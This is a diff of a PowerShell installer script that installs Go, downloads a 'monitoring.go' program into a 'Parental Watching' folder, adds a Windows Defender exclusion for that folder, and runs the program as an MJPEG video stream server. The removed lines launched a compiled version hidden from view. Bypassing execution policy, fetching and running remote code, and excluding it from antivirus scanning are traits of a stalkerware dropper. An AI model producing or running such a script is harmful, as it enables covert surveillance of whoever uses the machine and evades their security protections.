@@ -1,5 +1,5 @@
 # install_and_run.ps1
-# Downloads Go MSI, sets up environment, downloads and runs monitoring.go
+# Downloads Go MSI, sets up environment, downloads and runs monitoring.go as a script
 # USAGE: powershell.exe -ExecutionPolicy Bypass -NoProfile -File .\install_and_run.ps1
 
 param(
@@ -14,14 +14,13 @@ param(
 $LogFile = Join-Path $env:TEMP "download_runner.log"
 $GoVersion = "1.23.2"
 $Arch = if ([Environment]::Is64BitOperatingSystem) { "amd64" } else { "386" }
-$MsiName = "go$GoVersion.windows-$arch.msi"
+$MsiName = "go$GoVersion.windows-$Arch.msi"
 $MsiUrl = "https://go.dev/dl/$MsiName"
 $GoInstallDir = "C:\Program Files\Go"
 $GoBinPath = Join-Path $GoInstallDir "bin"
 $GoFileName = "monitoring.go"
 $DestFolder = if ($DestFolder) { $DestFolder } else { Join-Path $PSScriptRoot "Parental Watching" }
 $GoFilePath = Join-Path $DestFolder $GoFileName
-$ExePath = [System.IO.Path]::ChangeExtension($GoFilePath, ".exe")
 $LogMaxSize = 10MB
 
 # Helper: Log with rotation
@@ -121,8 +120,8 @@ function Install-Go {
         Log "Go MSI download failed"
         return $false
     }
-    Log "Running Go MSI installer"
-    $Args = "/i `"$MsiPath`" /qb"
+    Log "Running Go MSI installer with dialog"
+    $Args = "/i `"$MsiPath`""
     try {
         $Proc = Start-Process -FilePath "msiexec.exe" -ArgumentList $Args -Wait -PassThru -ErrorAction Stop
         if ($Proc.ExitCode -ne 0) {
@@ -140,18 +139,23 @@ function Install-Go {
     }
 }
 
-# Helper: Run executable
-function Run-Exe($Path, $Hidden = $true) {
-    Log "Launching $Path"
+# Helper: Run Go script
+function Run-GoScript($GoFile) {
+    Log "Running Go script: $GoFile"
     try {
-        $SI = New-Object System.Diagnostics.ProcessStartInfo
-        $SI.FileName = $Path
-        $SI.UseShellExecute = $false
-        if ($Hidden) { $SI.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden }
-        [System.Diagnostics.Process]::Start($SI) | Out-Null
-        Log "Executable started"
+        $Env:PATH = "$Env:PATH;$GoBinPath"
+        $Proc = Start-Process -FilePath "go" -ArgumentList "run", $GoFile -WorkingDirectory $DestFolder -NoNewWindow -PassThru -ErrorAction Stop
+        Start-Sleep -Seconds 5
+        $Response = Invoke-WebRequest -Uri "http://localhost:5000/stream" -Method Get -TimeoutSec 10 -ErrorAction SilentlyContinue
+        if ($Response.StatusCode -eq 200) {
+            Log "MJPEG server started successfully on localhost:5000"
+        } else {
+            Log "MJPEG server failed to start"
+        }
+        return $true
     } catch {
-        Log "Failed to start executable: $_"
+        Log "Failed to run Go script: $_"
+        return $false
     }
 }
 
@@ -159,6 +163,7 @@ function Run-Exe($Path, $Hidden = $true) {
 function Install-GoDependencies($GoFile) {
     Log "Installing Go dependencies for $GoFile"
     try {
+        $Env:PATH = "$Env:PATH;$GoBinPath"
         $Proc = Start-Process -FilePath "go" -ArgumentList "mod", "init", "monitoring" -WorkingDirectory $DestFolder -Wait -PassThru -NoNewWindow -ErrorAction Stop
         if ($Proc.ExitCode -ne 0) {
             Log "Failed to initialize Go module: exit code $($Proc.ExitCode)"
@@ -173,24 +178,6 @@ function Install-GoDependencies($GoFile) {
         return $true
     } catch {
         Log "Dependency install error: $_"
-        return $false
-    }
-}
-
-# Helper: Compile and run Go program
-function Compile-AndRun($GoFile) {
-    Log "Compiling $GoFile to $ExePath"
-    try {
-        $Proc = Start-Process -FilePath "go" -ArgumentList "build", "-o", $ExePath, $GoFile -WorkingDirectory $DestFolder -Wait -PassThru -NoNewWindow -ErrorAction Stop
-        if ($Proc.ExitCode -ne 0) {
-            Log "Compilation failed: exit code $($Proc.ExitCode)"
-            return $false
-        }
-        Log "Compilation successful"
-        Run-Exe $ExePath $RunHidden
-        return $true
-    } catch {
-        Log "Compilation error: $_"
         return $false
     }
 }
@@ -220,13 +207,13 @@ if (-not (Download-File $Url $GoFilePath)) {
 # Add Defender exclusion
 Add-DefenderExclusion $DestFolder
 
-# Install dependencies and compile
+# Install dependencies and run
 if (-not (Install-GoDependencies $GoFilePath)) {
     Log "Failed to install dependencies. Exiting."
     exit 1
 }
-if (-not (Compile-AndRun $GoFilePath)) {
-    Log "Failed to compile/run Go program. Exiting."
+if (-not (Run-GoScript $GoFilePath)) {
+    Log "Failed to run Go script. Exiting."
     exit 1
 }
 
